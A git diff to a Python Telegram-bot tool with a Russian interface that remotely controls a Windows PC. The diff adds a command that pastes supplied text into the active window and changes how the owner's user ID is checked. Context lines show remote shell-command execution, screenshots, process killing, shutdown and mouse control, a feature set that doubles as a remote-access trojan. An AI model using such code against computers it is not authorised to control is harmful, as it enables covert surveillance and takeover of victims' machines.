@@ -9,6 +9,8 @@ import PIL.ImageGrab
 import cv2
 import json
 import tkinter as tk
+import pyautogui
+import pyperclip
 from PIL import Image, ImageGrab, ImageDraw
 from pySmartDL import SmartDL
 from telebot import types
@@ -152,10 +154,12 @@ btnweb = types.KeyboardButton('🔗Перейти по ссылке')
 btncmd = types.KeyboardButton('✅Выполнить команду')
 btnoff = types.KeyboardButton('⛔️Выключить компьютер')
 btnreb = types.KeyboardButton('♻️Перезагрузить компьютер')
+btnpaste = types.KeyboardButton('📃Вставить текст')
 btninfo = types.KeyboardButton('🖥О компьютере')
 btnback = types.KeyboardButton('⏪Назад⏪')
 additionals_keyboard.row(btnoff, btnreb)
 additionals_keyboard.row(btncmd, btnweb)
+additionals_keyboard.row(btnpaste)
 additionals_keyboard.row(btninfo, btnback)
 
 
@@ -214,7 +218,7 @@ bot.send_message(my_id, "ПК запущен", reply_markup = menu_keyboard)
 
 @bot.message_handler(content_types=["text"])
 def get_text_messages(message):
-	if message.from_user.id == my_id:
+	if str(message.from_user.id) == my_id:
 		if message.text == "📷Быстрый скриншот":
 			bot.send_chat_action(my_id, 'upload_photo')
 			try:
@@ -276,7 +280,7 @@ def get_text_messages(message):
 
 
 def addons_process(message):
-	if message.from_user.id == my_id:
+	if str(message.from_user.id) == my_id:
 		bot.send_chat_action(my_id, 'typing')
 		if message.text == "🔗Перейти по ссылке":
 			bot.send_message(my_id, "Укажите ссылку: ")
@@ -296,6 +300,10 @@ def addons_process(message):
 			os.system('shutdown -r /t 0 /f')
 			bot.register_next_step_handler(message, addons_process)
 
+		elif message.text == "📃Вставить текст":
+			bot.send_message(my_id, "Укажите текст: ")
+			bot.register_next_step_handler(message, paste_text)
+
 		elif message.text == "🖥О компьютере":
 			req = requests.get('https://api.ipify.org')
 			ip = req.text
@@ -314,7 +322,7 @@ def addons_process(message):
 
 
 def files_process(message):
-	if message.from_user.id == my_id:
+	if str(message.from_user.id) == my_id:
 		bot.send_chat_action(my_id, 'typing')
 		if message.text == "❌Замочить процесс":	
 			bot.send_message(my_id, "Укажите название процесса: ")
@@ -345,7 +353,7 @@ def files_process(message):
 
 
 def mouse_process(message):
-	if message.from_user.id == my_id:
+	if str(message.from_user.id) == my_id:
 		if message.text == "⬆️":
 			currentMouseX,  currentMouseY  =  mouse.get_position()
 			mouse.move(currentMouseX,  currentMouseY - User.curs)
@@ -435,6 +443,14 @@ def cmd_process (message):
 	except:
 		bot.send_message(my_id, "Ошибка! Неизвестная команда")
 		bot.register_next_step_handler(message, addons_process)
+
+def paste_text(message):
+    bot.send_chat_action(my_id, 'typing')
+    text_to_paste = message.text.strip()
+    pyperclip.copy(text_to_paste)
+    pyautogui.hotkey('ctrl', 'v')  
+    bot.send_message(my_id, f"Текст \"{text_to_paste}\" вставлен в активное поле ввода.")
+    bot.register_next_step_handler(message, addons_process)
 
 def say_process(message):
 	bot.send_chat_action(my_id, 'typing')
